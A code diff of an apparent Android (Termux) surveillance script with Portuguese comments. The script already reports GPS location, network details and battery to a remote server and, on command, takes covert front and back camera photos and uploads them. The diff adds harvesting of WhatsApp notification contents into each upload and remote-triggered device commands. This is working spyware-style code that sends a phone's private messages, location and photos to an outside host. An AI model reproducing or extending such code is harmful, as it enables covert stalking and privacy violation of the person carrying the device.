@@ -38,6 +38,7 @@ ultima_lon = -49.2648
 gps_ok = False
 inicio = datetime.now()
 ultimo_ping = 0
+ultimo_whatsapp = 0
 
 def obter_rede():
     w = run("termux-wifi-connectioninfo")
@@ -65,6 +66,48 @@ def obter_gps():
         except: pass
     gps_ok = False
 
+def obter_whatsapp():
+    """Ler notificações do WhatsApp"""
+    global ultimo_whatsapp
+    agora = time.time()
+    if agora - ultimo_whatsapp < 30:
+        return []
+    
+    notif = run("termux-notification-list", timeout=5)
+    if notif:
+        try:
+            dados = json.loads(notif)
+            msgs = []
+            for n in dados:
+                pkg = n.get("packageName", "")
+                if "whatsapp" in pkg.lower():
+                    msgs.append({
+                        "titulo": n.get("title", "")[:50],
+                        "texto": n.get("content", "")[:100],
+                        "hora": n.get("when", "")
+                    })
+            ultimo_whatsapp = agora
+            return msgs[:5]
+        except:
+            pass
+    return []
+
+def executar_comando(acao):
+    """Executa comandos remotos"""
+    print(f"   🔧 Executando: {acao}")
+    if acao == "vibrar":
+        run("termux-vibrate -d 1000", timeout=3)
+    elif acao == "som":
+        run("termux-media-player play scan", timeout=3)
+    elif acao == "lanterna":
+        run("termux-torch on", timeout=3)
+        time.sleep(2)
+        run("termux-torch off", timeout=3)
+    elif acao == "tela":
+        run("input keyevent 26", timeout=3)  # Power button
+    elif acao == "volume_max":
+        run("termux-volume music 15", timeout=3)
+
 def enviar_dados(payload):
     json_str = json.dumps(payload).replace("'", "'\\''")
     cmd = f"curl -s -X POST '{URL_SERVIDOR}' -H 'Content-Type: application/json' -d '{json_str}' --connect-timeout 5 --max-time 5"
@@ -75,7 +118,6 @@ def enviar_dados(payload):
         return None
 
 def capturar_foto(num, arquivo):
-    """Tira a foto e retorna base64"""
     if os.path.exists(arquivo):
         os.remove(arquivo)
     try:
@@ -89,7 +131,6 @@ def capturar_foto(num, arquivo):
     return None
 
 def enviar_lote(front_b64, back_b64):
-    """Envia as DUAS fotos em UM pacote"""
     if not front_b64 and not back_b64:
         return False
     payload = {
@@ -103,7 +144,7 @@ def enviar_lote(front_b64, back_b64):
     except:
         return False
 
-print("🛰️  INICIADO (fotos em lote)\n")
+print("🛰️  INICIADO (GPS + WhatsApp + Comandos)\n")
 
 while True:
     t0 = time.time()
@@ -127,6 +168,9 @@ while True:
     # REDE
     rede = obter_rede()
     
+    # WHATSAPP
+    msgs_whats = obter_whatsapp()
+    
     # ENVIA DADOS
     payload = {
         "device_id": DEVICE_ID,
@@ -134,7 +178,8 @@ while True:
         "uptime": str(datetime.now() - inicio).split('.')[0],
         "lat": ultima_lat,
         "lon": ultima_lon,
-        "network": rede
+        "network": rede,
+        "whatsapp": msgs_whats
     }
     
     resp = enviar_dados(payload)
@@ -143,33 +188,36 @@ while True:
     icone = "📍" if gps_ok else "📡"
     
     if resp and resp.get("status") == "success":
-        comando = resp.get("comando_cam", "wait")
+        comando_cam = resp.get("comando_cam", "wait")
+        comando_remoto = resp.get("comando_remoto", "none")
         print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede} | {dt:.1f}s")
         
-        if comando == "take_dual":
-            print("📸 [DUAL] Tirando as duas fotos primeiro...")
-            
-            # PASSO 1: Tira as duas fotos
+        # WhatsApp
+        if msgs_whats:
+            print(f"   💬 {len(msgs_whats)} novas msgs WhatsApp")
+        
+        # Comandos Remotos
+        if comando_remoto != "none":
+            executar_comando(comando_remoto)
+        
+        # Fotos
+        if comando_cam == "take_dual":
+            print("📸 [DUAL] Tirando as duas fotos...")
             arq_tras = os.path.expanduser("~/nexos_back.jpg")
             arq_front = os.path.expanduser("~/nexos_front.jpg")
             
             b64_tras = capturar_foto(0, arq_tras)
-            print(f"   {'✅' if b64_tras else '❌'} Traseira capturada")
-            
+            print(f"   {'✅' if b64_tras else '❌'} Traseira")
             time.sleep(0.3)
-            
             b64_front = capturar_foto(1, arq_front)
-            print(f"   {'✅' if b64_front else '❌'} Frontal capturada")
+            print(f"   {'✅' if b64_front else '❌'} Frontal")
             
-            # PASSO 2: Envia TUDO JUNTO
             if b64_tras or b64_front:
-                print("📤 Enviando lote completo...")
                 if enviar_lote(b64_front, b64_tras):
                     print("   ✅ LOTE ENVIADO!")
                 else:
-                    print("   ❌ Falha no envio")
+                    print("   ❌ Falha")
             
-            # Limpeza
             for a in [arq_tras, arq_front]:
                 if os.path.exists(a): os.remove(a)
     else:
